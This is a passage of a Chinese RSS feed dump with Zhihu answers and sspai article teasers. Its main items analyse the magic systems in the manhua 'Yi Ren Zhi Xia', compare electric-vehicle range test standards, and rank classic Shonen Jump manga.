data-pid=\"QTRHizSX\">1417年3月，87岁的尼古拉去世。他生前的住所和捐建的墓室里刻满了奇怪的符号和难解的浮雕，引得各地炼金术士们挖地三尺寻找魔法石的秘密，盗墓者终于掘开了尼古拉夫妇的棺材，就像传奇故事应有的情节，棺材里一无所有。<br>1719年，保罗的书《土耳其之旅》在巴黎出版。其中一段他碰见一个奇怪的土耳其人，他对保罗说：“你真的相信他已经死了吗？不，我的朋友，尼古拉·弗拉梅尔还活着。无论是他还是他的妻子，都还不曾尝到死亡的滋味。”<br>1761年，据说塞缪在巴黎歌剧院的拱门下看到了尼古拉夫妇。<br>1929年，在巴黎，路易·保威尔讲道一个酷似尼古拉的老人。</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-58ab2b3861010d868fe87b47ab933a64_720w.jpg?rss\" data-rawwidth=\"536\" data-rawheight=\"415\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-58ab2b3861010d868fe87b47ab933a64\" data-watermark-src=\"v2-d7796533b7f9f3dfb2f45f38643d06c8\" data-private-watermark-src=\"v2-50095e5f5b45081d8b03e2eca6ce8992\"></p>\n<p data-pid=\"qOU3RIJf\">而《一人之下》中目前出现的三为人体炼成则风格各异：  </p>\n<p><img src=\"https://pic4.zhimg.com/v2-eb0271680eebb6e94cb336964e94593d_720w.jpg?rss\" data-rawwidth=\"2093\" data-rawheight=\"2055\" data-size=\"normal\" data-caption=\"人体炼金的不同流派\" data-watermark=\"watermark\" data-original-src=\"v2-eb0271680eebb6e94cb336964e94593d\" data-watermark-src=\"v2-2e85cb014d8aefb0801eafff0f483674\" data-private-watermark-src=\"v2-e146be21872ecd472148babbfc446484\"></p>\n<p data-pid=\"F_Xjjqlv\">而加西亚的人体合金攻击方式与火影中三代风影的铁矿砂界法非常相似。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7ba1d657ac14892d10383ed38ecef106_720w.jpg?rss\" data-rawwidth=\"1240\" data-rawheight=\"953\" data-size=\"normal\" data-caption=\"三代风影的大招\" data-watermark=\"watermark\" data-original-src=\"v2-7ba1d657ac14892d10383ed38ecef106\" data-watermark-src=\"v2-9d979f188bf6c9f78262fda7f2197e46\" data-private-watermark-src=\"v2-88db88ee06e0dd948e6e9a381069ab7f\"></p>\n<h3>阿方索的光系法术</h3>\n<p data-pid=\"vf4RvnqM\">阿方索的光系法术目前已经出场多次，每一次都让笔者误以为是在看《魔兽世界》圣骑士释放圣光法术，但是圣光能力本身确实是欧洲中世纪非常重要的宗教法术之一，甚至其源头的光照崇拜在整个欧洲中世纪都具有<b>神正论</b>上的重大意义，历来都是用于各类驱邪场合的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-15a3ad41a8fe824a81c6bcf7fc0a5844_720w.jpg?rss\" data-rawwidth=\"1701\" data-rawheight=\"1101\" data-size=\"normal\" data-caption=\"阿方索的光系法术\" data-watermark=\"watermark\" data-original-src=\"v2-15a3ad41a8fe824a81c6bcf7fc0a5844\" data-watermark-src=\"v2-24111bbc3b765f6a2f7fcf0c6e778cb9\" data-private-watermark-src=\"v2-7198b59cf9d542ebacb70d1ec05d03e7\" data-tags=\"porn\"></p>\n<p data-pid=\"P-2wEf_F\">按照伦敦大主教格罗塞泰斯特（Robert Grosseteste，约1170年—1253年）《创世六日》中影响深远的基督论所言，“圣子-言-光”是创造这个世界的三位一体的原力之一。</p>\n<p data-pid=\"eDAp3m1F\">15世纪N镇神秘剧(N town pIay)《基督诞生》<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\" data-text=\"The N-Town Plays: Introduction\" data-url=\"https://d.lib.rochester.edu/teams/text/sugano-n-town-plays-introduction\">[1]</sup>中，迟到的产婆不敢进入马厩，因为畏惧其中“比日月更璀璨的光芒”。</p>\n<p data-pid=\"Asrvnf4A\">14世纪护教作家约翰·默克的《节日布道集》中记载：“以得撒国王派画匠去为耶稣画像，然而圣容太过耀眼以至于画匠无法睁开双眼，只好用一块布盖住耶稣的脸，布上奇迹般地拓下了圣容;在圣烛节被祝福过的蜡烛不得用于非宗教场合，除非先将它们融化。教堂彩窗玻璃，手抄本上的金箔，书龛、圣物龛或十字架上的装饰宝石，神秘剧中闪亮的面具……众多物件因其反射或折射光的特质而具有神圣性，随之发展出一种光的拜物教”。</p>\n<p data-pid=\"dbizAaDL\">这种拜物教深深植根于《启示录》中对金碧辉煌的新耶路撒冷的描绘：纯金铺地，光盖日月，十二种宝石构成十二道璀璨的墙基，而基督羔羊本身就是至高的光源。</p>\n<h2>面具法师的法术</h2>\n<p data-pid=\"S2oRP28X\">这位带着红色金纹面具的翡翠学会巫师显然是本话中的重头戏，但是其能力源头和细节笔者暂时不敢妄做定论，只针对已经出现的几个能力特点稍作汇总，坐等下期米二如何解释：</p>\n<h3>1、可以灵体化的身躯</h3>\n<p data-pid=\"FGRKFGyO\">在单独对抗加西亚时，面具法师的身躯一度保持类似“恶灵状态”躲避加西亚合金的攻击。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7c934d35bd9986d6b53cabca33dc665e_720w.jpg?rss\" data-rawwidth=\"1745\" data-rawheight=\"503\" data-size=\"normal\" data-caption=\"灵体化身躯\" data-watermark=\"watermark\" data-original-src=\"v2-7c934d35bd9986d6b53cabca33dc665e\" data-watermark-src=\"v2-66f8c7f4197d0a679859c454e3a20a1c\" data-private-watermark-src=\"v2-a59eadc7b5bd3ed0dc98e55663c43923\"></p>\n<h3>2、吞噬空间的法术</h3>\n<p data-pid=\"5YSJmq5w\">面具法师反击时魔杖使出的球状法术，具有吞噬空间的能力，强悍如加西亚的合金（望月悟都不一定能砍动的合金）也会被轻易斩断，杀伤力惊人，加西亚直接躲避。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6d695ce816ba6eea628fdb87d8a916ba_720w.jpg?rss\" data-rawwidth=\"2153\" data-rawheight=\"883\" data-size=\"normal\" data-caption=\"吞噬空间\" data-watermark=\"watermark\" data-original-src=\"v2-6d695ce816ba6eea628fdb87d8a916ba\" data-watermark-src=\"v2-c1f5e41877843da9c84ca4f9c8a4d2e4\" data-private-watermark-src=\"v2-e741e7000d779b92f3c330ad2e848ece\"></p>\n<h3>3、影遁类法术</h3>\n<p data-pid=\"pLzeusJX\">面具法师可以制造大片阴影，将身躯隐藏其中，并通过其他媒介传送身躯。因为颜色和吞噬空间的法术及其相似，差点骗过加西亚，幸亏被阿方索及时识破。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-85239153852f8a4f1064a0fd14a7d56a_720w.jpg?rss\" data-rawwidth=\"1897\" data-rawheight=\"467\" data-size=\"normal\" data-caption=\"影遁类法术\" data-watermark=\"watermark\" data-original-src=\"v2-85239153852f8a4f1064a0fd14a7d56a\" data-watermark-src=\"v2-70dfad0a1f497fdb999fc50a93dc84f2\" data-private-watermark-src=\"v2-1d702d2c2f42893f6e241a9991bf4dc4\"></p>\n<p data-pid=\"GdjZsO40\">其实仔细观察影遁类法术和空间类法术在施法过程中确实存在细微差别。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-03a5524033cebb3a3b1f1561005c84de_720w.jpg?rss\" data-rawwidth=\"822\" data-rawheight=\"342\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-03a5524033cebb3a3b1f1561005c84de\" data-watermark-src=\"v2-5041273a3c8655b005e80b24a6a1ef5c\" data-private-watermark-src=\"v2-e73211de8645b0fe31b5765a7df38e31\"></p>\n<h3>4、护盾和火系法术</h3>\n<p data-pid=\"jPX5lmkm\">面具法师内心独白是护盾被击破而非法器被击破，说明在他看来，他的护身能力是属于法术而非法器。而护盾也可以理解为法术护盾，西方炼金一脉并非像东方练炁士普遍有强大的肉体能力，而法术护盾则是他们面对近战时必备的护身法术。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-44f9031541a25497e8bc772aec065149_720w.jpg?rss\" data-rawwidth=\"786\" data-rawheight=\"576\" data-size=\"normal\" data-caption=\"逃遁时下半身同时元素化也是保命技能\" data-watermark=\"watermark\" data-original-src=\"v2-44f9031541a25497e8bc772aec065149\" data-watermark-src=\"v2-ffa7c1dd730e49ca7fa3f423a3450009\" data-private-watermark-src=\"v2-d526254a67a62a126f62b6590f228aae\"></p>\n<p data-pid=\"q4fRl1KI\">面具法师的火系法术不论是从威力上还是范围上，都比之前出场过的其他人要大得多。考虑到这位的王牌设定，有此威力也不奇怪。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-48ba9145496e303fb736ac8058cd4c59_720w.jpg?rss\" data-rawwidth=\"761\" data-rawheight=\"830\" data-size=\"normal\" data-caption=\"超超超级大火球\" data-watermark=\"watermark\" data-original-src=\"v2-48ba9145496e303fb736ac8058cd4c59\" data-watermark-src=\"v2-d6cd837cc62d5a22f410fd8cd0c35763\" data-private-watermark-src=\"v2-587831b4d62916fca5181a0eac577d27\"></p>\n<h3>5、疑似多重人格或身躯</h3>\n<p data-pid=\"rPW92rGI\">一般来说，同时具有如此多种类且威力强劲的能力，这种级别的异人哪怕带上面具也太容易被人识破身份。毕竟这些纳森卫哪个都不是泛泛之辈，此人1V4还能打得如此有来有回，即便是放在翡翠学会也绝对是大佬级人物。但是现场没有任何人叫破他的身份，这一点确实诡异。</p>\n<p data-pid=\"oJuHgJW3\">而他在切换不同能力时，眼睛颜色的切换，皮肤的变化，都在向读者透露，此人恐怕并非明面上的那些大佬，而是某种具有多重人格（每个人格使用不同法术）或者多重身躯（原理同前）的特殊法师。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6d434745974c48234c1b9f1a77440b97_720w.jpg?rss\" data-rawwidth=\"670\" data-rawheight=\"231\" data-size=\"normal\" data-caption=\"眼球颜色的变化和皮肤的变化\" data-watermark=\"watermark\" data-original-src=\"v2-6d434745974c48234c1b9f1a77440b97\" data-watermark-src=\"v2-7fa5cab04bebcf694c4f107aa80fb40e\" data-private-watermark-src=\"v2-9464cec01559ca2ac75a2a6ee136eba2\"></p>\n<p data-pid=\"9TQXGpXA\">而这种能力的原型，笔者建议可以参考漫威电影的著名人物大群。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-98c20fc3b4d9beece9cca79f77f8feba_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"750\" data-size=\"normal\" data-caption=\"大群\" data-watermark=\"watermark\" data-original-src=\"v2-98c20fc3b4d9beece9cca79f77f8feba\" data-watermark-src=\"v2-13ef3034dd08ad4b513c2ce20326690a\" data-private-watermark-src=\"v2-aa1e49787407aa03c001f811344526ac\"></p>\n<p data-pid=\"tb2zTvfM\">加更完毕，欢迎评论区讨论。</p>\n<hr>\n<p><img src=\"https://pic2.zhimg.com/v2-f83441c775122c358f7a260f9d4a762d_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"856\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f83441c775122c358f7a260f9d4a762d\" data-watermark-src=\"v2-e11fccc15ea1541863577a8d178ea522\" data-private-watermark-src=\"v2-24fb535dad9acf52acd71253c6e2ebf3\"></p>\n<p data-pid=\"ISB_5E7w\">考证不易，跪求点赞！！！关注！！！评论！！！谢谢！！！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/he-xie-27-64?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">婺江墨客</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/521226875/answer/2384218547?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">22 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/439469100?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么一人之下最近每一话都上热搜?</a><br><a href=\"http://www.zhihu.com/question/480624238?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">一人之下，不摇碧莲的前五会是谁？</a><br>\n","link":"http://www.zhihu.com/question/521226875/answer/2384218547?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"城市漫步指南：绍兴，不妨住上几日","date":"2022-03-12 06:17:17","description":"一直以来，去一个陌生的城市，去探索土著习以为常的风景与味道，是我最惬意、也是最享受的时光。但我也会思考，我的家乡是一个值得探索的城市吗？从未来过绍兴的你，请花上10分钟，跟着我的回忆，看看这个处于现代 ...<a href=\"https://sspai.com/post/70958\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/70958"},{"title":"感受环法车手同款的乐趣，售价 11 万的自行车体验如何？","date":"2022-03-12 03:18:00","description":"我花 11 万买了辆车。\n\n听起来你可能觉得这个数目还好，11 万买辆车，大街上就能见到的不少比这更贵的车，没什么稀奇的。\n\n那如果我告诉你，这是一辆自行车呢？听起来就很吓人了。\n\n如果说满大街的自行车相当于丰田本田大众的家用车，11 万的自行车不是超级跑车，它是法拉利迈凯轮的 F1 赛车，造价上亿美元的舒马赫同款。毕竟一般来说，自行车都是百八十块钱搞定。放在自行车赛事里，它就可以是世界顶尖的环法选手们骑的同款。\n\n作为一个多年的自行车运动爱好者，11 万的汽车可能无法让我感到特别，但 11 万的自行车说不定真的能带来别样的快乐。<a href=\"https://sspai.com/post/71796\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71796"},{"title":"本周看什么丨最近值得一看的 8 部作品","date":"2022-03-11 09:49:25","description":"☕️TL;DR近期佳作推荐：[美剧]离职、[日剧]擅入寄居者、[美剧]辍学生、[电影]美国女孩、[美剧]超蓬勃：优步之战第一季、[动画]小太郎一个人生活、[美剧]星际迷航：皮卡德第二季、[纪录片]真实 ...<a href=\"https://sspai.com/post/72002\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/72002"},{"title":"Mac 的内置硬盘「作弊」了吗？（上）","date":"2022-03-11 08:34:03","description":"Mac 的固态硬盘性能一直是苹果宣传的重点。特别是近年 Apple T2、M1 等自研芯片整合了主控芯片后，Mac 内置固态硬盘相比竞品的性能优势似乎越发明显。在这样的背景下，如果有人站出来说「Mac 的固态硬盘速度有作弊之嫌」，想必会引起不少关注和争议。上个月，这样的讨论确实发生了。<p>[......]</p>\n<a href=\"https://sspai.com/prime/story/mac-ssd-cheating-1\" target=\"_blank\">查看全文</a><p>本文为会员文章，出自<a href=\"https://sspai.com/prime/precog/single\" target=\"_blank\">《单篇文章》</a>，订阅后可阅读全文。</p>\n","link":"https://sspai.com/prime/story/mac-ssd-cheating-1"},{"title":"与其搜肠刮肚，不如博采众长：帮你写出地道英文的在线语料库","date":"2022-03-11 08:00:55","description":"平时和英语口语写作打交道，常会遇到这种情况：想知道某个搭配地不地道、某个说法怎么讲，而词典上查不到。因为，一则词典毕竟收词有限，二则，多数词典全文索引不大便利。\n\n这时就得求救于索引范围更大的在线语料库了。这类服务网上有不少，这几年用下来，有两个我最觉得最顺手：Ludwig，Linggle。<a href=\"https://sspai.com/post/71962\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71962"},{"title":"春季活动缺席的 MacBook Air，也有着自己的故事","date":"2022-03-11 06:30:00","description":"距离上一次 MacBook Air 的配置更新已经过去了接近 500 天。<a href=\"https://sspai.com/post/71970\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71970"},{"title":"NEDC、WLTP、EPA 三种续航工况计算方式有什么区别？哪个对消费者更具参考价值？","date":"2022-03-11 03:40:34","description":"\n<p data-pid=\"4X8JG8Ji\">理论最大续航、NEDC续航、WLTP续航、EPA续航、CLTC续航、JC08续航，我这里做个简单的区分。先上结论，同一款车不同工况测试出的续航，从高到低如下：</p>\n<p data-pid=\"Sbt88FxC\">理论最大续航＞JC08＞CLTC＞NEDC＞WLTP＞EPA≥真实续航</p>\n<p data-pid=\"I36pPZfE\">排名越靠后，越接近真实续航。</p>\n<h2>\n<b>理论最大</b>续航</h2>\n<p data-pid=\"JOPbSm8K\">这里指的是电动车在最理想的条件下跑出的里程，一般是从头到尾定速60km/h，关闭空调等用电器材，环境温度18~28℃，这个数字是最不靠谱的，用它推测实际续航里程没什么意义。</p>\n<p data-pid=\"3aHfiKUM\">2018年左右，宣传最大理论续航的车企不少，当时为了数字好看用这个做海报，动辄续航上600公里，后来有媒体人发起呼吁不要用这个数字误导消费者，一番舆论发酵后，厂商们逐渐不再使用该数字。</p>\n<h2><b>NEDC续航（欧洲、澳大利亚、中国）</b></h2>\n<p data-pid=\"CpNSQEv_\">NEDC是一种工况跑法，就是在固定条件下测试出来的成绩，由市区和市郊两部分组成，具体操作方式如下：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2197904ded5398876188f76fcd83e76c_720w.jpg?rss\" data-caption=\"NEDC循环测试跑法\" data-size=\"normal\" data-rawwidth=\"827\" data-rawheight=\"487\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"qrHjT3s7\">市区部分模拟反复加速减速遇到红绿灯，从图表能看出是四次小循环的复制粘贴；而市郊部分则是模拟通畅道路，最高车速达到了120km/h，但维持时间极短。NEDC测试不开空调，总测试时长1180秒，也就是20分钟。</p>\n<h2><b>EPA（隶属美标）</b></h2>\n<p data-pid=\"0vvBDlv8\">EPA续航测试由3个部分组成，分别是FTP75工况、SC03工况和US06工况。下表是FTP75工况跑法：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-88cb19581db110c21bc1637361eef822_720w.jpg?rss\" data-caption=\"FTP75循环测试跑法\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"244\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"eH2K_T8_\">从图表就能看出，FTP75要比NEDC的跑法更复杂、车速更多变，测试时间更久。此外，EPA里面还有SC03和US06两个工况测试，分别对应高温空调全负荷以及高速/急加速，3个测试结果通过加权的方式计算出最终的油耗/续航里程，而且EPA测试中有的项目是要开空调的。业界基本认同现在美标的跑法比NEDC更接近实际用车情况，也更接近国内道路环境。</p>\n<h2>WLTP（日美欧共同制定）</h2>\n<p data-pid=\"0D_T5_Z4\">国内也有WLTC的说法，可以粗略认为WLTP和WLTC是一回事。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8a511a676e21e8f0d0599328ee340cd8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"566\" data-watermark=\"original\" data-original-src=\"v2-8a511a676e21e8f0d0599328ee340cd8\" data-watermark-src=\"v2-2ab27293c9bc541fe49e54f1f5cc6eab\" data-private-watermark-src=\"v2-042a20719c3261db74d2a23ee1144923\"></p>\n<p data-pid=\"nqgRh0_R\">WLTP的初衷是为了更好地模拟日常驾驶，所以从工况图中可以看出要比NEDC更加复杂，且高速续航、加减速更频繁。一些电动车比如我的小鹏P7，菜单设置中可以切换剩余续航显示方式，从NEDC切换到WLTP后，满电续航会从670公里下降到576公里。</p>\n<h2>CLTC（中国）</h2>\n<p data-pid=\"z57XGCw9\">从去年下半年开始，新上市的车型逐渐从NEDC切换到CLTC，这是我国根据自身情况制定的测试方法。所以将来大家看到某款车改款后电池、车身参数均没变，但续航变了，那就是切换到CLTC的缘故。</p>\n<p data-pid=\"c5O5eHrT\">但事实上，CLTC测试出的续航成绩比NEDC要高，也就是偏离实际续航更远，偏离幅度大概在↑2~5%。换句话说，某款车如果NEDC续航是600公里，切换到CLTC后，其标称续航可能会达到610~620公里。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-04425a0d27508713d18ae3746e8e936b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"588\" data-rawheight=\"295\" data-watermark=\"original\" data-original-src=\"v2-04425a0d27508713d18ae3746e8e936b\" data-watermark-src=\"v2-8ad815f794e2f72b8fe29a4e756e7213\" data-private-watermark-src=\"v2-eed1d455e9c1b420f03d02302ac42c3b\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4dde2734cca8729e3318580c4615a061_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"668\" data-rawheight=\"413\" data-watermark=\"original\" data-original-src=\"v2-4dde2734cca8729e3318580c4615a061\" data-watermark-src=\"v2-aa5b2ff3bc33e7e82730e4ea4f2d40f7\" data-private-watermark-src=\"v2-326e1ec81dd0d5893349152dc795cd11\"></p>\n<p data-pid=\"bT-58KHV\">这两张图分别对比了NEDC、WLTP和CLTC的工况差异。可以看出，CLTC停车等待的时间更久，测试里程更短，最高车速更低，平均车速更低，平均功率也更低，这些因素对于电动车来说都是利好的，因此测出来的数据更好看，也就不足为奇了。</p>\n<h2><b>JC08（日本）</b></h2>\n<p data-pid=\"7W9vEQKi\">JC08是最水的测试，成绩比其他工况法都要好，当然JC08是日本自己弄出来自己用的，对于别国道路情况人家也不在乎，国内没有厂商用JC08来宣传续航成绩。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/kai-zi-56?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">凯凯</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520432531/answer/2384107159?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/445727738?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待特斯拉被质疑续航里程有水分，是利用了EPA测试规则的「漏洞」？</a><br><a href=\"http://www.zhihu.com/question/507042489?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">各位车主们你们三年前买的纯电动汽车现在续航还有50公里嘛？</a><br>\n","link":"http://www.zhihu.com/question/520432531/answer/2384107159?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"软硬件双管齐下，旧回忆栩栩如生——我的老照片数码化心得","date":"2022-03-11 03:32:57","description":"人生的感受是，年纪越大，时间过得越快。快节奏的生活已经很少能保留住一些特别场景的记忆，就像我知道自己是每天开车上班，但如果没有特别的事情发生，开车这一小时就像完全不会保存在脑子里的。这样一来，似乎一年大概会丢失 300 个小时。\n而最近另一个感受，因为多年来和年轻的同事工作，以前的朋友同学联系得也少了，自己好像和童年记忆脱节，很多事情像是上个辈子发生的。\n80、90 年代保留下来的几百上千张照片，全部一张张堆叠在箱子里，我计划花个把月时间来做整理，单是分类就是繁重的工作，而扫描这一步骤，要最具性价比又高效的输出方案。<a href=\"https://sspai.com/post/71669\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71669"},{"title":"《少年 Jump》历史前 20 的作品排行榜应该怎么排？","date":"2022-03-11 03:10:21","description":"\n<p data-pid=\"2n7e5avW\">按<b>时间顺序</b>说一下我的看法：</p>\n<h3>（1）男儿当大将（男一匹ガキ大将 <b>本宮 ひろ志</b> 1968）</h3>\n<p><img src=\"https://pic2.zhimg.com/v2-f42e28d83ae1e504860df668259a7467_720w.jpg?rss\" data-rawwidth=\"287\" data-rawheight=\"445\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-f42e28d83ae1e504860df668259a7467\" data-watermark-src=\"v2-a4d9d3ef9ac4980017515facd690af86\" data-private-watermark-src=\"v2-76daeffc8e46f6a25ffd9b4819d3f882\" data-tags=\"porn\"></p>\n<p data-pid=\"fhOW9mVv\">如果说《少年jump》是一个帝国，那这本漫画就是其立国之本。</p>\n<p data-pid=\"wnodCsbq\">在它之前《少年jump》的台柱子是一部叫《父之魂》的棒球漫画，《男儿当大将》只是在《父之魂》休刊期间临时顶上来的作品，结果一发不可收拾，顶替其成为当红台柱子。</p>\n<p data-pid=\"D3Bdquhw\">同样的故事在后来的《龙珠》身上还会再次上演。</p>\n<p data-pid=\"U54lkbJW\">开启了不良少年打架漫画的热潮，将《少年jump》从名不见经传的二流杂志直接推上一流。本宫宏志本人则是《少年jump》初代编辑长长野规到三代编辑长西村繁男的亲历者和功臣，影响了无数后世漫画家（比如车田正美）。</p>\n<p data-pid=\"-5oPQmtf\">就算不按时间顺序而是单纯地论贡献，天字第一号给本宫宏志也没啥毛病。</p>\n<h3>（2）破廉耻学园（ハレンチ学園  永井豪 1968）</h3>\n<p><img src=\"https://pic4.zhimg.com/v2-f6808d2c652111cc110c35724045637b_720w.jpg?rss\" data-rawwidth=\"422\" data-rawheight=\"640\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-f6808d2c652111cc110c35724045637b\" data-watermark-src=\"v2-0ac9d0518f59a25ed2314eefbc454ec3\" data-private-watermark-src=\"v2-93a5c0a722b390ec44d0aab6e945827c\" data-tags=\"porn\"></p>\n<p data-pid=\"6s7vsRFL\">和《男儿当大将》并称的两大上古门神。</p>\n<p data-pid=\"g53VUwU7\">对内容不予置评，单纯从题材上，《破》和《男》分别确保了《少年jump》在故事漫画（ストーリー漫画）和搞笑漫画（ギャグ漫画）两大漫画题材上齐头并进，两条腿走路让杂志的风格更平衡。</p>\n<p data-pid=\"5ZxK1FJa\">搞擦边球搞出社会事件，某种意义上这也算是在《少年jump》上后无来者的记录。</p>\n<p data-pid=\"o7rtBJNE\">一个是不良少年统一江湖，一个是问题学校对抗教育系统，这两个作品植根于当时日本风云变化的社会现实，也从另一个侧面突出了它们的历史代表性。</p>\n<h3>（3）乌龙派出所（こちら葛飾区亀有公園前派出所 秋本治 1976）</h3>\n<p><img src=\"https://pic2.zhimg.com/v2-6ab7a24ab26607d8c409930d421f2336_720w.jpg?rss\" data-rawwidth=\"367\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6ab7a24ab26607d8c409930d421f2336\" data-watermark-src=\"v2-c55088cef5d05fa15272f26ec90b03ce\" data-private-watermark-src=\"v2-fdce6749fca7f24418ad8b3cfed2350f\" data-tags=\"porn\"></p>\n<p data-pid=\"QGVfCRpX\">跨越了若干时代的《少年jump》活化石。</p>\n<p data-pid=\"TF4hOgVO\">二代编辑长中野祐介强化搞笑漫画方针的一个突出成果。作为搞笑漫画，其突破在于采用了比较写实的剧画画风（而不是像破廉耻学园那样的漫画风格）。</p>\n<p data-pid=\"qHSA_snq\">认同其历史地位主要出于其连载长度、国民认知度以及其记录下来的日本社会风貌变迁。</p>\n<hr>\n<p data-pid=\"Z_mOiIy0\">以上三部基本上代表了《少年jump》创刊的第一个十年（1968-1978），随后将进入《少年jump》稳步起飞的上升期，如果说在此之前的作品总给人过于古早的断层感，那么接下来少年漫画将大踏步地向如今我们熟悉的样子前进。</p>\n<p data-pid=\"YV6vOKOU\">一些陪跑作品：</p>\n<ul>\n<li data-pid=\"xTW5pQUE\">\n<b>《阿斯特罗球团》&amp;《父之魂》</b>，超级系也好现实系也罢，这都是《少年sunday》和《少年magazine》玩剩下的了，再毅力能毅力过《明日之丈》？再魔幻能魔幻过《巨人之星》？只是同类杂志中一种常见的作品题材而没有走出自己的风格，这是《少年jump》体育类作品的尴尬之处，除了那一部作品....</li>\n<li data-pid=\"o31d1P7f\">\n<b>《魔神Z》</b>，永井豪又一力作，其改编动画被视为萝卜片的始祖。不过那已经进入“动画”而非“漫画”的范畴了，所以略过不提。</li>\n</ul>\n<p data-pid=\"T89qPpFw\">还有一些很有特色但后继无人的题材比如《包丁人味平》（美食漫画）、《哥普拉》（美式太空歌剧），非常可惜。</p>\n<hr>\n<h3>（4）阿拉蕾（Dr.スランプ 鳥山明 1980）</h3>\n<p><img src=\"https://pic4.zhimg.com/v2-0ea4477dbac747d824e507629fb071d4_720w.jpg?rss\" data-rawwidth=\"342\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-0ea4477dbac747d824e507629fb071d4\" data-watermark-src=\"v2-36fc702d5b82af105448ab88155477c2\" data-private-watermark-src=\"v2-275d69f8519d0570cf707b8b0a3b33e9\"></p>\n<p data-pid=\"XPRsFmgD\">比起《龙珠》，更接近鸟山明本质的作品。</p>\n<p data-pid=\"3NFporXK\">历史功绩在于作为国民度极高的搞笑漫画，将《少年jump》的读者群从少年扩大到未成年儿童及女性。罕见地以女孩子作为主角，也算是开了《少年jump》的先河（虽然可能很少有人意识到这件事情）。</p>\n<p data-pid=\"0TrNvJ5o\">对《少年jump》销量上升作出突出贡献，更大的贡献在于给鸟岛和彦积累了功绩，最大的贡献在于给鸟山明的下一步作品积累了功力（笑）。</p>\n<h3>（5）北斗神拳（北斗の拳 武論尊（原作）、原哲夫（作画）1983）</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-062413fc6cc29ec66469a5bece1f02ae_720w.jpg?rss\" data-rawwidth=\"345\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-062413fc6cc29ec66469a5bece1f02ae\" data-watermark-src=\"v2-74cefcac7ed94d7d339600ed181bdb7c\" data-private-watermark-src=\"v2-6a0dd452b12cffbb614a2bbfcbc43412\" data-tags=\"porn\"></p>\n<p 